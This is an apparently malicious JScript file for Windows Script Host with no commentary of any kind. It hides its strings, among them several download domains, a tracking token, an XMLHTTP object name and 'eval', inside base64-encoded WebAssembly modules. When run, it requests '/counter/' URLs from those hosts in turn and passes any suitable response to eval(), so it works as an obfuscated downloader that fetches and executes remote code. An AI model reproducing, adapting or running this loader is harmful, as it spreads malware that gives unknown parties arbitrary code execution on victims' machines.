const __universalAtob = function (b64Encoded) {
    try {
        let binary_string = atob(b64Encoded), len = binary_string.length, bytes = new Uint8Array(len);
        for (let i = 0; i < len; i++) {
            bytes[i] = binary_string.charCodeAt(i);
        }
        return bytes;
    } catch (err) {
        return new Uint8Array(global.Buffer.from(b64Encoded, 'base64'));
    }
};
const __callWasmBuffer = 'AGFzbQEAAAABhICAgAABYAAAAo+AgIAAAQNlbnYHaW1wRnVuYwAAA4KAgIAAAQAEhICAgAABcAAABYOAgIAAAQABB5GAgIAAAgZtZW1vcnkCAARkYXRhAAEKioCAgAABhICAgAAAEAAL';
const __callWasmModule = new WebAssembly.Module((() => {
    try {
        let binary_string = atob(__callWasmBuffer), len = binary_string.length, bytes = new Uint8Array(len);
        for (let i = 0; i < len; i++) {
            bytes[i] = binary_string.charCodeAt(i);
        }
        return bytes;
    } catch (err) {
        return new Uint8Array(global.Buffer.from(__callWasmBuffer, 'base64'));
    }
})());
const __wasmStringModules = ['AGFzbQEAAAAFg4CAgAABAAEG7ICAgAASfwBBAQt/AEHmAAt/AEHsAAt/AEHuAQt/AEHyAQt/AEH2AQt/AEGGAgt/AEGMAgt/AEGSAgt/AEGWAgt/AEGaAgt/AEGeAgt/AEGkAgt/AEGoAgt/AEGsAgt/AEGwAgt/AEG8Agt/AEHAAgsHooGAgAATBm1lbW9yeQIABWRhdGEwAwAFZGF0YTEDAQVkYXRhMgMCBWRhdGEzAwMFZGF0YTQDBAVkYXRhNQMFBWRhdGE2AwYFZGF0YTcDBwVkYXRhOAMIBWRhdGE5AwkGZGF0YTEwAwoGZGF0YTExAwsGZGF0YTEyAwwGZGF0YTEzAw0GZGF0YTE0Aw4GZGF0YTE1Aw8GZGF0YTE2AxAGZGF0YTE3AxELkIOAgAASAEEBC2NpcHBhLW1heC5jb20lMjBib3VuY2lucGxheS5jb20lMjBzdWJ1cmJhbi1zYW5pdGF0aW9uLmNvbSUyMGFhby5oYXdhaWljb252ZW50aW9uLmNvbSUyMGRvY3RvcnMubGl2ZQAAQeYACwQlMjAAAEHsAAuAATAwMDAwMDFOWm9zM3hmZVFpN1VmRFl3UjI0eVVMOVB0dEZCZUtVMWRyUlVZaVlxb2ZDVVQ0RWxpam93Zm5kbTlCV192UjAzaC1QRnoxekJ1ZmRWYlpmbjZKRVdKS0kwTllZYUZqaWh0c0xJa05rWi1HR2FuOUFqOVJpaHJEelUAAEHuAQsCcAAAQfIBCwJNAABB9gELDlNYTUwyLlhNTEhUVFAAAEGGAgsEJTJGAABBjAILBEdFVAAAQZICCwJoAABBlgILAnQAAEGaAgsCdAAAQZ4CCwQlM0EAAEGkAgsCYwAAQagCCwJvAABBrAILAnUAAEGwAgsLbnRlciUyRiUzRgAAQbwCCwJhAABBwAILBWV2YWwA'].map(__bytes => {
    const bytesToUse = __universalAtob(__bytes);
    return new WebAssembly.Instance(new WebAssembly.Module(bytesToUse));
});
const lS = (wI, pos, iWC) => {
    let __str = '';
    if (!Array.isArray(wI)) {
        let __targetModule = __wasmStringModules[wI];
        let __mem = new Uint8Array(__targetModule.exports.memory.buffer);
        const __stringKey = `data${ pos }`;
        let __start = __targetModule.exports[__stringKey] - 1;
        let __str = '';
        let i = __start;
        let __c = __mem[i++];
        while (!(parseInt(__c) & 128) && __mem[i]) {
            __str += __c;
            __c = String.fromCharCode(__mem[i++]);
        }
        __str += __c;
        __str = decodeURIComponent(__str.substring(1));
        return __str;
    } else {
        for (const __wasmIndex of wI) {
            let __targetModule = __wasmStringModules[__wasmIndex];
            let __mem = new Uint8Array(__targetModule.exports.memory.buffer);
            const __stringKey = `data${ pos }`;
            let __start = __targetModule.exports[__stringKey] - 1;
            let i = __start;
            let __c = __mem[i++];
            while (!(parseInt(__c) & 128) && __mem[i]) {
                __str += __c;
                __c = String.fromCharCode(__mem[i++]);
            }
            __str += __c;
        }
        __str = decodeURIComponent(__str.substring(1));
        return __str;
    }
};
var x = lS(0, 0).split(lS(0, 1));
var m = lS(0, 2);
var zx = lS(0, 3);
for (var i = 0; i < x.length; i++) {
    var e = WScript.CreateObject(lS(0, 4) + lS(0, 5));
    try {
        var ter = lS(0, 6);
        (() => {
            const __callInstance1 = new WebAssembly.Instance(__callWasmModule, {
                env: {
                    impFunc: () => {
                        e.open(lS(0, 7), lS(0, 8) + lS(0, 9) + lS(0, 10) + zx + lS(0, 11) + ter + ter + x[i] + ter + lS(0, 12) + lS(0, 13) + lS(0, 14) + lS(0, 15) + m, false);
                    }
                }
            });
            const __exports = __callInstance1.exports;
            return __exports.data();
        })();
        (() => {
            const __callInstance0 = new WebAssembly.Instance(__callWasmModule, {
                env: {
                    impFunc: () => {
                        e.send();
                    }
                }
            });
            const __exports = __callInstance0.exports;
            return __exports.data();
        })();
        var r = e.responseText;
        if (r.length > 1000 && r.indexOf(m) > -1) {
            var ikagdh = r.split(m).join(lS(0, 16));
            window[lS(0, 17, true)](ikagdh);
            break;
        }
        ;
    } catch (e) {
    }
    ;
}
;